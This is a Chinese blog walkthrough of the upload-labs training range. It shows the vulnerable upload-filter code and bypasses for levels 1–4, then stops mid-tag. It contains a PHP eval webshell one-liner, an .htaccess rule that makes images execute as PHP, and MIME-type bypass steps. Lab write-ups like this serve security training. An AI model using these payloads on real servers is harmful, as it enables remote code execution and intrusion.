{"blogid": "126452541", "writerAge": "码龄1年", "writerBlogNum": "121", "writerCollect": "1485", "writerComment": "1284", "writerFan": "3423", "writerGrade": "5级", "writerIntegral": "4401", "writerName": "不知名白帽", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_126452541.jpg", "writerRankTotal": "3864", "writerRankWeekly": "49", "writerThumb": "1576", "writerVisitNum": "63146", "blog_read_count": "1360", "blog_time": "已于 2022-08-31 14:58:44 修改", "blog_title": "Upload-labs（1-21关详细教程）【简单易懂】【万字教程】", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE-toc\" style=\"margin-left:0px;\"><a href=\"#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE\">思维导图</a></p>\n<p id=\"%E7%BB%83%E4%B9%A0%E7%BD%91%E7%AB%99%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E7%BB%83%E4%B9%A0%E7%BD%91%E7%AB%99%EF%BC%9A\">练习网站：</a></p>\n<p id=\"%E6%B3%A8%E6%84%8F%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E6%B3%A8%E6%84%8F%EF%BC%9A\">注意：</a></p>\n<p id=\"%E7%9F%A5%E8%AF%86%E7%82%B9-toc\" style=\"margin-left:0px;\"><a href=\"#%E7%9F%A5%E8%AF%86%E7%82%B9\">知识点</a></p>\n<p id=\"Pass-01-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-01\">Pass-01</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-02-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-02\">Pass-02</a></p>\n<p id=\"%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A\">知识点：</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A%C2%A0-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A%C2%A0\">提示： </a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-03%EF%BC%88%E6%9C%AC%E5%85%B3%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAupload-labs%EF%BC%89-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-03%EF%BC%88%E6%9C%AC%E5%85%B3%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAupload-labs%EF%BC%89\">Pass-03（本关需要使用自己搭建upload-labs）</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-04-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-04\">Pass-04</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-05%EF%BC%88%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E6%90%AD%E5%BB%BA%E7%9A%84Upload-labs%EF%BC%89-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-05%EF%BC%88%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E6%90%AD%E5%BB%BA%E7%9A%84Upload-labs%EF%BC%89\">Pass-05（建议使用本机搭建的Upload-labs）</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"%E5%85%88%E4%B8%8A%E4%BC%A0.user.ini-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%85%88%E4%B8%8A%E4%BC%A0.user.ini\">先上传.user.ini</a></p>\n<p id=\"%E5%86%8D%E4%B8%8A%E4%BC%A0phpinfo.jpg-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%86%8D%E4%B8%8A%E4%BC%A0phpinfo.jpg\">再上传phpinfo.jpg</a></p>\n<p id=\"%E6%9F%A5%E7%9C%8Breadme.php%E6%96%87%E4%BB%B6-toc\" style=\"margin-left:80px;\"><a href=\"#%E6%9F%A5%E7%9C%8Breadme.php%E6%96%87%E4%BB%B6\">查看readme.php文件</a></p>\n<p id=\"Pass-06-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-06\">Pass-06</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-07-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-07\">Pass-07</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-08-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-08\">Pass-08</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-09-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-09\">Pass-09</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-10%C2%A0-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-10%C2%A0\">Pass-10 </a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%C2%A0%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%C2%A0%E6%8F%90%E7%A4%BA%EF%BC%9A\"> 提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-11-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-11\">Pass-11</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-12-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-12\">Pass-12</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%C2%A0%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%C2%A0%E6%8F%90%E7%A4%BA%EF%BC%9A\"> 提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-13-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-13\">Pass-13</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-14-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-14\">Pass-14</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A%C2%A0-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A%C2%A0\">提示： </a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-15-17-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-15-17\">Pass-15-17</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-18-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-18\">Pass-18</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-19-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-19\">Pass-19</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<p id=\"Pass-20-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-20\">Pass-20</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"Pass-21-toc\" style=\"margin-left:0px;\"><a href=\"#Pass-21\">Pass-21</a></p>\n<p id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</a></p>\n<p id=\"-toc\" style=\"margin-left:80px;\"></p>\n<p id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</a></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<h1>思维导图</h1>\n<p><img alt=\"\" height=\"822\" src=\"..\\..\\static\\image\\71cccd457f6d4156b30ec9a8ccc7c6d2.png\" width=\"1200\"/></p>\n<p>思维导图分享</p>\n<p>链接：https://pan.baidu.com/s/1N4mvnQhawhYKRHNwJDEAMw <br/> 提取码：iu9g </p>\n<p></p>\n<p></p>\n<h1 id=\"%E7%BB%83%E4%B9%A0%E7%BD%91%E7%AB%99%EF%BC%9A\">练习网站：</h1>\n<p><a href=\"http://124.222.95.131:9999/Pass-01/index.php\" title=\"upload-labs\">upload-labs</a>（旧靶场20关）1-2关使用了旧靶场</p>\n<p><a href=\"http://124.223.167.236:9000/Pass-01/index.php\" title=\"upload-labs\">upload-labs</a>（新靶场21关）3-21关使用了新靶场</p>\n<p><img alt=\"\" height=\"814\" src=\"..\\..\\static\\image\\55b9fc02a4dd42f8bf9bae79e1715c70.png\" width=\"1200\"/>​</p>\n<h1 id=\"%E6%B3%A8%E6%84%8F%EF%BC%9A\"><span style=\"color:#ff9900;\">注意：</span></h1>\n<p><span style=\"color:#ff9900;\">能运行&lt;?php phpinfo();?&gt;</span></p>\n<p><span style=\"color:#ff9900;\">就能运行&lt;?php eval($_POST['cmd'])?&gt;一句话木马</span></p>\n<p><span style=\"color:#ff9900;\">本文使用&lt;?php phpinfo();?&gt;主要是为了简便</span></p>\n<h1 id=\"%E7%9F%A5%E8%AF%86%E7%82%B9\"><span style=\"color:#956fe7;\">知识点</span></h1>\n<p><span style=\"color:#956fe7;\">$_FILES[表单提交过来的name]</span></p>\n<p><span style=\"color:#956fe7;\">[name]:获取到的文件名</span></p>\n<p><span style=\"color:#956fe7;\">[type]: 获取到的文件类型(MIMETYPE)</span></p>\n<p><span style=\"color:#956fe7;\">[tmp_name]:文件临时存放的路径</span></p>\n<p><span style=\"color:#956fe7;\">[error]: 上传文件报错信息(为空则上传成功)</span></p>\n<p><span style=\"color:#956fe7;\">[size]:上传文件的大小</span></p>\n<p><span style=\"color:#956fe7;\">Move_uploaded_file(需要移动的文件,要移动到的位置)</span></p>\n<p><span style=\"color:#956fe7;\">Strrchr(指定字符串,匹配的字符) --指针指到指定的字符的位置，取之后的值</span></p>\n<p><span style=\"color:#956fe7;\">Trim() --去除字符串中的前后空格</span></p>\n<p><span style=\"color:#956fe7;\">Rtrim() --去除右空格</span></p>\n<p><span style=\"color:#956fe7;\">Ltrim() --去除左空格</span></p>\n<p><span style=\"color:#956fe7;\">Strtolower() --将字符串转为小写</span></p>\n<p><span style=\"color:#956fe7;\">Str_ireplace --(被转换的字符串，替换成的字符串，需要查找的字符串)</span></p>\n<p><span style=\"color:#956fe7;\">在需要查找的字符串中查找需要被替换的字符串，替换为指定的字符串</span></p>\n<h1 id=\"Pass-01\">Pass-01</h1>\n<h2 id=\"%E4%BB%A3%E7%A0%81%EF%BC%9A\">代码：</h2>\n<div>\n<pre><code class=\"language-javascript\">function checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"请选择要上传的文件!\");\n        return false;\n    }\n    //定义允许上传的文件类型\n    var allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n</code></pre>\n</div>\n<h2 id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A\">提示：</h2>\n<p>本pass在客户端使用js对不合法图片进行检查！</p>\n<h2 id=\"%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A\">解题思路：</h2>\n<p>安装插件disable javascript</p>\n<p><img alt=\"\" height=\"94\" src=\"..\\..\\static\\image\\aeb7295005bb4c6fb8b409701c570a18.png\" width=\"600\"/>​</p>\n<p>编写一句话木马文件shell.php</p>\n<p><img alt=\"\" height=\"99\" src=\"..\\..\\static\\image\\675001d561dc4fdebfd06a1817af0d5c.png\" width=\"316\"/>​</p>\n<p>根据提示关闭js上传文件，查看上传文件是否成功</p>\n<p><img alt=\"\" height=\"176\" src=\"..\\..\\static\\image\\6419a3e859894fc3a3e964a29f12e72a.png\" width=\"609\"/>​</p>\n<p></p>\n<p>使用蚁剑通过密码连接</p>\n<p><img alt=\"\" height=\"423\" src=\"..\\..\\static\\image\\89537cc869b54945b4c6e14579763f22.png\" width=\"619\"/>​</p>\n<p><img alt=\"\" height=\"165\" src=\"..\\..\\static\\image\\036be430a83a475e806340033fc0f214.png\" width=\"614\"/>​</p>\n<h1 id=\"Pass-02\">Pass-02</h1>\n<h2 id=\"%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A\">知识点：</h2>\n<p>MIME TYPE常见分类</p>\n<p><img alt=\"\" height=\"390\" src=\"..\\..\\static\\image\\e26707b4da2542ac90f6eb2f7dddd60a.png\" width=\"763\"/>​</p>\n<h2>代码：</h2>\n<div>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n</div>\n<h2 id=\"%E6%8F%90%E7%A4%BA%EF%BC%9A%C2%A0\">提示： </h2>\n<p>本pass在服务端对数据包的MIME进行检查！</p>\n<h2>解题思路：</h2>\n<p>编写木马</p>\n<p><img alt=\"\" height=\"190\" src=\"..\\..\\static\\image\\90b58e2afaf04bd7a91ba9427831342c.png\" width=\"576\"/>​</p>\n<p>上传PHP文件</p>\n<p>绕过MIMETYPE</p>\n<p>burpsuite抓包修改类型</p>\n<p><img alt=\"\" height=\"309\" src=\"..\\..\\static\\image\\0dc05a205e1242beaa35e209368176af.png\" width=\"603\"/>​</p>\n<p>forward释放数据包</p>\n<p><img alt=\"\" height=\"492\" src=\"..\\..\\static\\image\\eff7c58f26c04d5988a6a93ac66642de.png\" width=\"637\"/>​</p>\n<p>打开图片链接</p>\n<p><img alt=\"\" height=\"656\" src=\"..\\..\\static\\image\\51bf0d98c4e647dea71bd480c1a6e6c7.png\" width=\"1143\"/>​</p>\n<p>发现能够执行上传的php文件</p>\n<p><img alt=\"\" height=\"785\" src=\"..\\..\\static\\image\\33b58b65637a4471952da77135ef6d2e.png\" width=\"1200\"/>​</p>\n<h1 id=\"Pass-03%EF%BC%88%E6%9C%AC%E5%85%B3%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAupload-labs%EF%BC%89\">Pass-03（本关需要使用自己搭建upload-labs）</h1>\n<p>upload-labs资源</p>\n<p>链接：https://pan.baidu.com/s/1uOM7sSAFusLk-973SkZlCw <br/> 提取码：ctyl </p>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p>\n<h2>解题思路：</h2>\n<p>httpd.conf文件下添加代码</p>\n<p>AddType application/x-httpd-php .php .phtml .php3 .php4</p>\n<p>该句代码的意思是将.php、.php3、.php4当作php文件</p>\n<p><img alt=\"\" height=\"196\" src=\"..\\..\\static\\image\\c28edd08a35e47caaeeeab203ada655e.png\" width=\"570\"/></p>\n<p>上传phpinfo.php4</p>\n<p><img alt=\"\" height=\"181\" src=\"..\\..\\static\\image\\cb5afc5aac9a4e0488ec7cb56d2d800f.png\" width=\"567\"/></p>\n<p>打开图片链接</p>\n<p>就能查看运行的PHP文件</p>\n<h1 id=\"Pass-04\">Pass-04</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p>\n<h2>解题思路：</h2>\n<p>上传.htaccess文件</p>\n<p>将jpg文件当作php文件执行</p>\n<pre><code>&lt;FilesMatch 'phpinfo.jpg'&gt;\nSetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code></pre>\n<p>再上传phpinfo.jpg（是由phpinfo.php改后缀成phpinfo.jpg）</p>\n<p>打开链接</p>\n<p><img alt=\"\" height=\"655\" src=\"..\\..\\static\\image\\7a0401c7966a40009242da34f88b978f.png\" width=\"1200\"/></p>\n<h1 